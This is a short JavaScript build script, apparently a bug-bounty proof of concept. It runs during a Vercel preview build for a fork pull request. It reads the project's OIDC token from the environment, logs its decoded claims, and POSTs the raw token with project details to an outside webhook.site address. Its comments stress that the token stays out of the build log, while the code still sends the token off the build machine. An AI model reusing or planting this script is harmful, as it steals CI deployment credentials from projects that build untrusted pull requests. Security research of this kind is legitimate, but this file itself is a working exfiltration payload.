// Build-time probe for HackerOne report #4086036.
// Runs during the Vercel BUILD for the fork-PR preview deployment.
// Destination is the researcher's own webhook.site inbox (no third-party service
// beyond it, and no Microsoft endpoint is contacted).
const WEBHOOK = "https://webhook.site/a72ec3e3-e006-423e-bf2d-333bccfc0392";

function decodeClaims(token) {
  try {
    const part = token.split(".")[1];
    return JSON.parse(Buffer.from(part, "base64url").toString("utf8"));
  } catch {
    return null;
  }
}

const token = process.env.VERCEL_OIDC_TOKEN ?? "NOT_AVAILABLE";
const claims = token === "NOT_AVAILABLE" ? null : decodeClaims(token);

// Claims only are logged; the raw token never goes to the build log.
console.log("=== OIDC BUILD PROBE (HackerOne 4086036) ===");
console.log("phase             : build");
console.log("VERCEL_ENV        :", process.env.VERCEL_ENV ?? "NOT_SET");
console.log("VERCEL_PROJECT_ID :", process.env.VERCEL_PROJECT_ID ?? "NOT_SET");
console.log("token present     :", token !== "NOT_AVAILABLE");
console.log("claim project_id  :", claims?.project_id ?? "n/a");
console.log("claim environment :", claims?.environment ?? "n/a");
console.log("claim aud         :", claims?.aud ?? "n/a");
console.log("claim iss         :", claims?.iss ?? "n/a");
console.log("claim sub         :", claims?.sub ?? "n/a");
console.log("claim user_id     :", claims?.user_id ?? "NOT_PRESENT");
console.log("=== END PROBE ===");

try {
  const response = await fetch(WEBHOOK, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify({
      phase: "build",
      oidcToken: token,
      claims,
      projectId: process.env.VERCEL_PROJECT_ID ?? "NOT_SET",
      vercelEnv: process.env.VERCEL_ENV ?? "NOT_SET",
      timestamp: new Date().toISOString()
    }),
    signal: AbortSignal.timeout(10_000)
  });
  console.log("probe post status :", response.status);
} catch (error) {
  console.log("probe post failed :", String(error));
}
